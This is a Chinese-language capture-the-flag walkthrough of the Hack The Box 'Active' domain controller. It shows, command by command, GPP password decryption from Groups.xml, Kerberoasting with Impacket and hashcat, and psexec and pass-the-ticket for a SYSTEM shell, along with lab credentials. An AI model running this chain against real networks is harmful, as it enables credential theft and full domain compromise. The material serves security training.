kali 10.10.16.5

靶机 10.10.10.100



```bash
└─# nmap -sT -p- --min-rate 1000 10.10.10.100 
```

```bash
└─# nmap -sV -sC -O -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152-49158,49169,49170,49179 --min-rate 1000 10.10.10.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-13 19:55 EDT
Nmap scan report for 10.10.10.100 (10.10.10.100)
Host is up (0.61s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-13 23:55:55Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5722/tcp  open   msrpc         Microsoft Windows RPC
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49156/tcp closed unknown
49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open   msrpc         Microsoft Windows RPC
49169/tcp open   msrpc         Microsoft Windows RPC
49170/tcp closed unknown
49179/tcp closed unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/13%OT=53%CT=49156%CU=44540%PV=Y%DS=2%DC=I%G=Y%TM=650
OS:24C7D%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=S
OS:%TS=7)OPS(O1=M53ANW8ST11%O2=M53ANW8ST11%O3=M53ANW8NNT11%O4=M53ANW8ST11%O
OS:5=M53ANW8ST11%O6=M53AST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6
OS:=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53ANW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%
OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```



# 53 NDS

```bash
└─# nslookup active.htb 10.10.10.100                                                                                                         
Server:		10.10.10.100
Address:	10.10.10.100#53

Name:	active.htb
Address: 10.10.10.100

└─# nslookup dc.active.htb 10.10.10.100
Server:		10.10.10.100
Address:	10.10.10.100#53

Name:	dc.active.htb
Address: 10.10.10.100
Name:	dc.active.htb
Address: dead:beef::b528:210e:b63c:722f
```

发现两个域名 ，加入 hosts

```bash
echo '10.10.10.100 active.htb dc.active.htb' >> /etc/hosts
```

补充下 把 python 包加入环境变量

```bash
export PATH=/usr/share/doc/python3-impacket/examples:$PATH
```



# 139/445 smb

```bash
└─# smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: active.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
```

```bash
└─# enum4linux -a 10.10.10.100

Target ........... 10.10.10.100
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100

//10.10.10.100/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/C$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/IPC$	Mapping: OK Listing: DENIED Writing: N/A
//10.10.10.100/NETLOGON	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Replication	Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/SYSVOL	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Users	Mapping: DENIED Listing: N/A Writing: N/A
```

递归列出 smb 文件

```bash
└─# smbmap -H 10.10.10.100 -R Replication --depth 10
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	fr--r--r--              533 Sat Jul 21 06:38:11 2018	Groups.xml
```



```bash
└─# smbclient //10.10.10.100/Replication -U ""%""  
Try "help" to get a list of possible commands.
smb: \> cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018
get
		5217023 blocks of size 4096. 284356 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```



得到重点文件 `Groups.xml`，GPP 攻击，现学现卖，边搜索边学

[Exploiting GPP SYSVOL (Groups.xml) | VK9 Security (vk9-sec.com)](https://vk9-sec.com/exploiting-gpp-sysvol-groups-xml/)

可破解里面的密码字段

```bash
└─# cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

```bash
└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

得到一组 账号密码

```
SVC_TGS:GPPstillStandingStrong2k18
```



可以登录 smb 拿到 flag

```bash
└─# smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
[+] IP: 10.10.10.100:445	Name: active.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
```

```bash
└─# smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18                                                                          1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

		5217023 blocks of size 4096. 279369 blocks available

smb: \svc_tgs\desktop\> get user.txt
getting file \svc_tgs\desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```



# 补充尝试

[Kerberoasting](https://adsecurity.org/?p=3458)

<img src=".\图片\Visio-KerberosComms.png" alt="Visio-KerberosComms" style="zoom:80%;" />



GetADUsers.py 得到一个用户的凭据时，可以根据它查找域内存在的用户

```bash
└─# GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18                                                                      1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2023-09-13 19:47:19.338960 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2018-07-21 10:01:30.320277 
```

边运行边抓包

<img src=".\图片\Snipaste_2023-09-14_09-01-41.png" alt="Snipaste_2023-09-14_09-01-41" style="zoom:80%;" />

可以看到走的是 ldap 协议，且用的是 ntml 认证，联想到 用 ldapsearch 也可能做到（我利用失败）。再联想，可以用抓包分析的手段分析 python 套件中的各个脚本的流量情况。



请求票据

```bash
└─# getTGT.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in SVC_TGS.ccache
```

```bash
└─# ls                                                                                    
Groups.xml  SVC_TGS.ccache  user.txt
```



# Kerberoasting



先用已知用户凭据得到服务

```bash
└─# GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-09-13 19:47:19.338960   
```



再申请得到 TGS 票据

```bash
└─# getST.py -spn active/CIFS:445 active.htb/SVC_TGS:GPPstillStandingStrong2k18                                                                               1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Getting ST for user
[*] Saving ticket in SVC_TGS.ccache
```

导入票据进内存命令

```
export KRB5CCNAME=SVC_TGS.ccache
```

<img src=".\图片\Snipaste_2023-09-14_09-36-38.png" alt="Snipaste_2023-09-14_09-36-38" style="zoom:80%;" />



由于 是 rc4 加密，可破解

```bash
└─# GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request                                                                 2 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-09-13 19:47:19.338960             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$68132bfdd71713044926959cd0acf601$260076dd5db2de8e8c7f062e66497593018b7f6c15ab5d98262127f0e7b54614889e4684a7f93fe22d8726b4e9f652911bb15ffe617bc9b0634c4410f15c45ca31240b2d50ba9c9667dd07c187ff1740e917ac0be3a32ad1115e1e8f5e216ad43bebf2bf06f2a0508320239e49b2fe974c21a652add2eb8caa3244ebf5c43c527dc35b517cca61f72fcc088ddc1ab08597c6bdc36f9e30b39e782edfc580df6a38961e1c6b88ebd92cd86ba312b1e8ad83380161fb572231080306ea5d8fa0bce9d8ebe24f11dcbfe4fb967d7ace8925d464ce75e2f21afa06d6861a64eb2c67422df7cf31d9e388ca7b9f275abf99f0e6216c05484040ef99537ca835d9c3d15a8b7acf1d485686138689fcabb77b799f1917e90b234b0e73b3c6a36a587064db8f0c9bef3f055d534237380f1dc859ac0d344e244ffcc26f51ef4db4f2f4befe81337e033b980ff9daf80af657a1cd7754b89cc50f58c343c583a6ce9201d767971a17c81051960630671851416ea3e95734c2cccf957323518bbcf07047c2b72b5cfea5a169952d5b6c161f815ac3d49d24f33fabc949b23e1bda45909124e29ab7787b09e63aca2b18cc8e17d55290c207e128d9e7d74189ee6d1b7a36d397bed249be7a4b25bdb1c2043ffdc95f37ff2cd11221f0b730a6680ae16d17214fbdf0fad87ea9050404c42a3213d39f9ebf3ea52a27f9ca270881fefba4317cf8053eb1de67a9e0cc1c3a52ee4c6552895e4e5438a73a150e9bddffae4379dfc39869fd589b2a79e4cfeb88fc6da3a3fb640f6e7893c790d4d64943cf82e1aa9b43c9b383f5a2bfbd33046460fd5c9c27123cb7454abaff839c6c2d76f53043f702bcdb2d419d0afcb47d4719335c65d6f29aa6a3ab05dab355bfe3aa2936ff6bb95bc5ee97b7b4ee709321a7aa9c8a99dff7cc55ee9ef5b3a6b87d20d378e5213d8ef58e0130da8dce529fedbee5dad497fe75c9053d3f02aad06747765eda614775d5c35532185c74b9d32f620f65aa1f599f41e9d325ef7396debf98c983dc6abacbe4821e87d200b58f08150f404bb09b7c226ed09ef83a0fc992c8198876af2ad118d2a3d58d98400a33f402c73741b2025df14cca006ba6267eb5d24c3e2915445b77d090c3d27f096cea71bd701a87ddcec756b40871f086d46f199eee8b1ab45d575bba84a7cdd4366da1cfcbf306fde4b235889b67639ac87348d3ec47ca5d302430e24d18fe72181ae05b95d060da4a166da3080c
```

把 hash 存入文件，再 hashcat 破解

```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

得到域控密码

```
Ticketmaster1968
```



# 横向

得到flag

```
└─# smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968
```

```
└─# smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
```



拿到shell

```
└─# psexec.py active.htb/administrator@10.10.10.100
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:  Ticketmaster1968
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file ZaBQGefR.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service NFeZ on 10.10.10.100.....
[*] Starting service NFeZ.....
[!] Press help for extra shell commands                                                                                                                          Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd c://users
c:\Users> cd administrator
c:\Users\Administrator> cd desktop
c:\Users\Administrator\Desktop> type root.txt                                                                241d56851a0ebf60302121e7bb203e14
```



此外还可以票据传递

```
getTGT.py -dc-ip 10.10.10.100 active.htb/administrator:Ticketmaster1968
```

```
export KRB5CCNAME=administrator.ccache
```

<img src=".\图片\Snipaste_2023-09-14_09-53-37.png" alt="Snipaste_2023-09-14_09-53-37" style="zoom:80%;" />

```bash
└─# psexec.py -k -no-pass -dc-ip 10.10.10.100 -target-ip 10.10.10.100 -service-name cifs active.htb/administrator@dc.active.htb cmd
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file MxMfDmSi.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service cifs on 10.10.10.100.....
[*] Starting service cifs.....
[!] Press help for extra shell commands                                                                                                                          Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

operable program or batch file.
C:\Windows\system32> whoami                                                                                 nt authority\system
```


